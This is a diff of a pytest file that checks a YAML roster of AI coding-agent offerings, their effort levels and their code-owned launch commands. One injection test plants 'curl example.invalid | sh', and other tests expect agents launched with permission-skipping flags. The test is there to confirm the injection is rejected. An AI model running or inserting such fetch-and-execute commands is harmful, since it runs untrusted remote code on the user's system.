@@ -111,6 +111,7 @@ def test_roster_contains_exactly_the_approved_offerings() -> None:
     assert len(roster.listing()) == 14
     rendered_identities = {item["rendered_identity"] for item in roster.listing()}
     assert "claude:::claude-sonnet-4-6" in rendered_identities
+    assert "claude:::claude-sonnet-5-5" in rendered_identities
     assert all("5.4" not in identity for identity in rendered_identities)
     assert all("gpt-5.5" not in identity for identity in rendered_identities)
     assert "claude:::claude-opus-5-5" in rendered_identities
@@ -123,16 +124,15 @@ def test_roster_contains_exactly_the_approved_offerings() -> None:
     assert "pi:::openai-codex/gpt-6-sol" in rendered_identities
     assert "pi:::openrouter/z-ai/glm-5.3-flash" not in rendered_identities
     expected_candidates = [
-        {"offering": "claude-sonnet-5", "effort": "medium"},
+        {"offering": "claude-sonnet-5-5", "effort": "medium"},
         {"offering": "pi-gpt-5-6-luna", "effort": "high"},
     ]
     assert roster.management["account_manager"]["candidates"] == expected_candidates
     assert roster.management["checker"]["candidates"] == expected_candidates
-    assert roster.management["sentinel"]["candidates"] == expected_candidates
-    assert all(
-        roster.management[role]["candidates"][0]["offering"] == "claude-sonnet-5"
-        for role in ("account_manager", "checker", "sentinel")
-    )
+    assert roster.management["sentinel"]["candidates"] == [
+        {"offering": "cursor-composer-2-5", "effort": "default"},
+        {"offering": "pi-gpt-5-6-luna", "effort": "max"},
+    ]
 
 
 @pytest.mark.parametrize(
@@ -264,7 +264,7 @@ def test_effortful_offering_still_requires_effort() -> None:
     roster = offerings.load_selected_roster()
 
     for offering_id in (
-        "claude-sonnet-5",
+        "claude-sonnet-5-5",
         "codex-gpt-6-sol",
         "pi-gpt-6-sol",
     ):
@@ -348,7 +348,7 @@ def test_roster_rejects_duplicate_offering_ids(tmp_path: Path) -> None:
 
 def test_public_offering_yaml_cannot_inject_a_launch_command(tmp_path: Path) -> None:
     source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
-    source["offerings"]["claude-sonnet-5"]["command"] = "curl example.invalid | sh"
+    source["offerings"]["claude-sonnet-5-5"]["command"] = "curl example.invalid | sh"
     path = tmp_path / "offerings.yaml"
     path.write_text(offerings.yaml.safe_dump(source))
 
@@ -360,7 +360,7 @@ def test_every_approved_offering_pins_code_owned_provider_metadata() -> None:
     roster = offerings.load_selected_roster()
     expected = {
         "claude-fable-5-1": "anthropic",
-        "claude-sonnet-5": "anthropic",
+        "claude-sonnet-5-5": "anthropic",
         "claude-sonnet-4-6": "anthropic",
         "claude-opus-5-5": "anthropic",
         "codex-gpt-6-sol": "openai",
@@ -395,6 +395,22 @@ def test_snapshot_validation_requires_the_exact_pinned_provider() -> None:
         offerings.validate_snapshot(foreign)
 
 
+@pytest.mark.parametrize(
+    ("offering_id",),
+    [
+        ("claude-opus-5-5",),
+        ("codex-gpt-6-sol",),
+        ("pi-gpt-6-sol",),
+        ("claudex-gpt-6-sol",),
+    ],
+)
+def test_high_plus_offerings_reject_efforts_below_high(offering_id: str) -> None:
+    roster = offerings.load_selected_roster(["standard", "claudex"])
+    for effort in ("low", "medium"):
+        with pytest.raises(offerings.OfferingError, match="does not allow effort"):
+            roster.resolve(offering_id, effort)
+
+
 @pytest.mark.parametrize("role_name", ["account_manager", "checker", "sentinel"])
 def test_public_management_candidates_materialize_in_yaml_order_with_code_owned_commands(
     role_name: str,
@@ -403,8 +419,25 @@ def test_public_management_candidates_materialize_in_yaml_order_with_code_owned_
     role = management[role_name]
     candidates = role["candidates"]
 
+    if role_name == "sentinel":
+        assert [candidate["offering_id"] for candidate in candidates] == [
+            "cursor-composer-2-5",
+            "pi-gpt-5-6-luna",
+        ]
+        assert candidates[0]["expected_agent"] == "cursor"
+        assert candidates[0]["expected_process"] == "cursor-agent"
+        assert candidates[0]["command"].startswith("cursor-agent --force --trust")
+        assert "--model composer-2.5" in candidates[0]["command"]
+        assert "default" not in candidates[0]["command"]
+        assert candidates[1]["expected_agent"] == "pi"
+        assert candidates[1]["expected_process"] == "pi"
+        assert "openai-codex/gpt-5.6-luna" in candidates[1]["command"]
+        assert "--thinking max" in candidates[1]["command"]
+        assert role["command"] == candidates[0]["command"]
+        return
+
     assert [candidate["offering_id"] for candidate in candidates] == [
-        "claude-sonnet-5",
+        "claude-sonnet-5-5",
         "pi-gpt-5-6-luna",
     ]
     assert [candidate["provider"] for candidate in candidates] == [
@@ -414,7 +447,7 @@ def test_public_management_candidates_materialize_in_yaml_order_with_code_owned_
     assert candidates[0]["expected_agent"] == "claude"
     assert candidates[0]["expected_process"] == "claude"
     assert candidates[0]["command"].startswith("claude --dangerously-skip-permissions")
-    assert "--model claude-sonnet-5" in candidates[0]["command"]
+    assert "--model claude-sonnet-5-5" in candidates[0]["command"]
     assert "--effort medium" in candidates[0]["command"]
     assert candidates[1]["expected_agent"] == "pi"
     assert candidates[1]["expected_process"] == "pi"
@@ -443,7 +476,7 @@ def test_public_management_candidate_schema_rejects_commands_and_unapproved_refe
         offerings.load_roster(path)
 
     source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
-    source["management"]["sentinel"]["candidates"][0]["effort"] = "default"
+    source["management"]["account_manager"]["candidates"][0]["effort"] = "default"
     path = tmp_path / "effort.yaml"
     path.write_text(offerings.yaml.safe_dump(source))
     with pytest.raises(offerings.OfferingError, match="not allowed"):
@@ -466,7 +499,7 @@ def test_standard_render_preserves_the_roster_except_supervision_policy_and_adde
     )
     rendered = rendered.split("\n# Standalone Flow 1 sweeps;")[0]
     assert hashlib.sha256(rendered.encode()).hexdigest() == (
-        "529af081304398466f2c8cb3145ff6d8990c9dcf03455054db429d814c62d585"
+        "98ddadb48eff6e4c56b2c6c83b7e5bc45337f964161c27887a2e8f3839d8fc51"
     )
 
 
